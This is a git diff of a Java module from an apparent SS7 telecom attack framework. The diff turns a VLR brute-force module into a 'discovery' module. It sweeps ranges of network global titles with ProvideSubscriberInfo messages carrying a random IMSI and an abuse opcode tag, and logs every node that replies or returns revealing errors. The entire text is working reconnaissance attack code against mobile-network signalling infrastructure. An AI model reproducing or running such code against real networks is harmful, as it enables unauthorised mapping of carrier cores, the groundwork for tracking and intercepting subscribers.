@@ -17,13 +17,11 @@
  * along with this program.  If not, see <http://www.gnu.org/licenses/>
  */
 
-/**
- * @author Ayman ElSherif
- */
-
 package com.rodan.intruder.ss7.usecases.attacks.infogathering;
 
+import com.rodan.intruder.kernel.usecases.SignalingModule;
 import com.rodan.intruder.kernel.usecases.model.PayloadCollection;
+import com.rodan.intruder.kernel.usecases.model.NodeDiscoveryInfo;
 import com.rodan.intruder.ss7.entities.event.model.MapMessage;
 import com.rodan.intruder.ss7.entities.event.model.error.ErrorComponent;
 import com.rodan.intruder.ss7.entities.event.model.mobility.PsiResponse;
@@ -33,50 +31,61 @@ import com.rodan.intruder.ss7.entities.payload.mobility.PsiPayload;
 import com.rodan.intruder.ss7.usecases.Ss7BruteforceModuleTemplate;
 import com.rodan.intruder.ss7.usecases.model.Ss7ModuleConstants;
 import com.rodan.intruder.ss7.usecases.model.Ss7ModuleOptions;
-import com.rodan.intruder.ss7.usecases.model.infogathering.VlrBruteforceOptions;
-import com.rodan.intruder.ss7.usecases.model.infogathering.VlrBruteforceResponse;
+import com.rodan.intruder.ss7.usecases.model.infogathering.VlrDiscoveryOptions;
+import com.rodan.intruder.ss7.usecases.model.infogathering.VlrDiscoveryResponse;
 import com.rodan.intruder.ss7.usecases.port.Ss7Gateway;
 import com.rodan.library.model.Constants;
 import com.rodan.library.model.annotation.Module;
 import com.rodan.library.model.error.SystemException;
 import com.rodan.library.model.notification.NotificationType;
-import com.rodan.intruder.kernel.usecases.SignalingModule;
+import com.rodan.library.util.LongRunningTask;
 import com.rodan.library.util.Util;
 import lombok.Builder;
+import lombok.SneakyThrows;
 import org.apache.log4j.LogManager;
 import org.apache.log4j.Logger;
 
-@Module(name = Ss7ModuleConstants.VLR_BF_NAME, category = Ss7ModuleConstants.INFO_GATHERING_CATEGORY_DISPLAY_NAME,
-        displayName = Ss7ModuleConstants.VLR_BF_DISPLAY_NAME, brief = Ss7ModuleConstants.VLR_BF_BRIEF,
-        description = Ss7ModuleConstants.VLR_BF_DESCRIPTION, rank = Ss7ModuleConstants.VLR_BF_RANK,
+import java.util.ArrayList;
+import java.util.List;
+
+/**
+ * @author Ayman ElSherif
+ */
+@Module(name = Ss7ModuleConstants.VLR_DISCOVERY_NAME, category = Ss7ModuleConstants.INFO_GATHERING_CATEGORY_DISPLAY_NAME,
+        displayName = Ss7ModuleConstants.VLR_DISCOVERY_DISPLAY_NAME, brief = Ss7ModuleConstants.VLR_DISCOVERY_BRIEF,
+        description = Ss7ModuleConstants.VLR_DISCOVERY_DESCRIPTION, rank = Ss7ModuleConstants.VLR_DISCOVERY_RANK,
         mainPayload = Constants.PSI_PAYLOAD_NAME)
-public class VlrBruteforceModule extends Ss7BruteforceModuleTemplate implements SignalingModule, MapMobilityServiceListener {
-    final static Logger logger = LogManager.getLogger(VlrBruteforceModule.class);
+public class VlrDiscoveryModule extends Ss7BruteforceModuleTemplate implements SignalingModule, MapMobilityServiceListener {
+    final static Logger logger = LogManager.getLogger(VlrDiscoveryModule.class);
+
+    private List<NodeDiscoveryInfo> discoveredVlrGts;
 
     @Builder
-    public VlrBruteforceModule(Ss7Gateway gateway, Ss7ModuleOptions moduleOptions) {
+    public VlrDiscoveryModule(Ss7Gateway gateway, Ss7ModuleOptions moduleOptions) {
         super(gateway, moduleOptions);
-        var options = (VlrBruteforceOptions) moduleOptions;
+        var options = (VlrDiscoveryOptions) moduleOptions;
         if (!options.getDelayMillis().isBlank()) {
             setBruteforceDelay(Integer.valueOf(options.getDelayMillis()));
         }
-
         setTaskWaitTime(6000); // Increase wait time to wait for possible valid remote node replies
-        setWaitForResponseFailedMessage("Failed to retrieve current VLR of user");
+        this.discoveredVlrGts = new ArrayList<>();
     }
 
+    @SneakyThrows // TODO IMP: remove and handle/throw system exception
     @Override
     protected void generatePayload() {
         logger.debug("Generating payload");
         logger.debug("Module Options: " + moduleOptions);
-        var options = (VlrBruteforceOptions) moduleOptions;
+        var options = (VlrDiscoveryOptions) moduleOptions;
+
         var vlrGtStream = Util.generateGtRange(options.getTargetVlrRange());
+        var imsi = Util.generateRandomImsi(options.getMcc(), options.getMnc());
         var payloadCollection = PayloadCollection.<Ss7Payload>builder()
                 .dataSource(vlrGtStream.getStream()).totalDataSize(vlrGtStream.getSize())
                 .payloadGenerator((vlrGt) ->
                         PsiPayload.builder()
                                 .localGt(options.getNodeConfig().getSs7Association().getLocalNode().getGlobalTitle())
-                                .imsi(options.getImsi()).targetVlrGt(String.valueOf(vlrGt))
+                                .imsi(imsi).targetVlrGt(String.valueOf(vlrGt))
                                 .abuseOpcodeTag(options.getAbuseOpcodeTag())
                                 .mapVersion(options.getMapVersion())
                                 .build()
@@ -84,10 +93,9 @@ public class VlrBruteforceModule extends Ss7BruteforceModuleTemplate implements 
                 .build();
 
         setPayloadIterator(payloadCollection);
-
         var dummyPayload = PsiPayload.builder()
                 .localGt(options.getNodeConfig().getSs7Association().getLocalNode().getGlobalTitle())
-                .imsi(options.getImsi()).targetVlrGt("")
+                .imsi(imsi).targetVlrGt("")
                 .abuseOpcodeTag(options.getAbuseOpcodeTag())
                 .mapVersion(options.getMapVersion())
                 .build();
@@ -105,6 +113,26 @@ public class VlrBruteforceModule extends Ss7BruteforceModuleTemplate implements 
     }
 
     @Override
+    protected void waitForResponse() throws SystemException {
+        var responseWaitTask = LongRunningTask.builder()
+                .workStartMessage("Waiting for server response...").workWaitMessage(null)
+                .workDoneMessage("Response received successfully")
+                .workFailedMessage(getWaitForResponseFailedMessage())
+                .workDoneCheck(m -> isResultReceived() || isExecutionError())
+                .startWorkAction(null)
+                .waitTime(getTaskWaitTime()).checkInterval(getTaskCheckInterval())
+                .throwExceptionOnFailure(false)
+                .build();
+        Util.startLongRunningTask(responseWaitTask);
+
+        moduleResponse = VlrDiscoveryResponse.builder()
+                .discoveredVlrGts(discoveredVlrGts)
+                .build();
+        setResultReceived(true);
+        logger.debug("PSI completed!");
+    }
+
+    @Override
     protected void cleanup() throws SystemException {
         super.cleanup();
         if (getGateway() != null && getMainPayload() != null) {
@@ -113,24 +141,19 @@ public class VlrBruteforceModule extends Ss7BruteforceModuleTemplate implements 
         }
     }
 
+    @SneakyThrows
     @Override
     public void onProvideSubscriberInfoResponse(PsiResponse response) {
-        try {
-            logger.debug("##### Received PSI response!");
-            logger.debug(response);
-            logger.debug("Parsing response.");
+        logger.debug("[[[[ onProvideSubscriberInfoResponse ]]]]");
+        logger.debug(response);
 
-            matchPayloadAddress(response);
-            moduleResponse = VlrBruteforceResponse.builder()
-                    .vlrGt(response.getVlrGt())
-                    .build();
-            setResultReceived(true);
-            logger.debug("PSI completed!");
+        var notes = "";
+        if(!matchPayloadAddress(response))
+            notes += "GT different from sent payload: " + response.getDialog().getRemoteAddress() + " | ";
 
-        } catch (SystemException e) {
-            notify(e.getMessage(), NotificationType.FAILURE);
-            setExecutionError(true);
-        }
+        var gt = response.getDialog().getRemoteAddress();
+        var reason = "PSI response received";
+        addDiscoveredVlrRecord(gt, reason, notes);
     }
 
     @Override
@@ -138,15 +161,25 @@ public class VlrBruteforceModule extends Ss7BruteforceModuleTemplate implements 
         logger.debug("[[[[[[[[[[    onErrorComponent      ]]]]]]]]]]");
         String msg = String.format("errorComponent: [%s]", errorComponent);
         logger.debug(msg);
-        if (isPossibleValidNodeResultCode(errorComponent) && !isUnknownUserResultCode(errorComponent)) {
-            msg = "Received " + errorComponent.getReadableError() + " from " + errorComponent.getRemoteAddress();
-            notify(msg, NotificationType.WARNING);
+        if (isPossibleValidNodeResultCode(errorComponent)) {
+            var vlrGt = errorComponent.getRemoteAddress();
+            var gt = errorComponent.getRemoteAddress();
+            var reason = "onErrorComponent received";
+            var notes = errorComponent.getReadableError();;
+            addDiscoveredVlrRecord(gt, reason, notes);
         }
+    }
+
+    private void addDiscoveredVlrRecord(String gt, String reason, String notes) {
+        notify("Discovered possible valid VLR: " + gt + "\tReason: " + reason, NotificationType.PROGRESS);
+        var vlrInfo = new NodeDiscoveryInfo(gt, reason, notes);
+        discoveredVlrGts.add(vlrInfo);
     }
 
     private boolean matchPayloadAddress(MapMessage message) throws SystemException {
         var correspondingPayload = (PsiPayload) getCorrespondingPayload(message);
         var correctVlrGt = correspondingPayload.getTargetVlrGt();
-        return !correctVlrGt.equals(message.getDialog().getRemoteAddress());
+        logger.debug("Payload sent to: " + correctVlrGt + ". Dialog received from: " + message.getDialog().getRemoteAddress());
+        return correctVlrGt.equals(message.getDialog().getRemoteAddress());
     }
 }
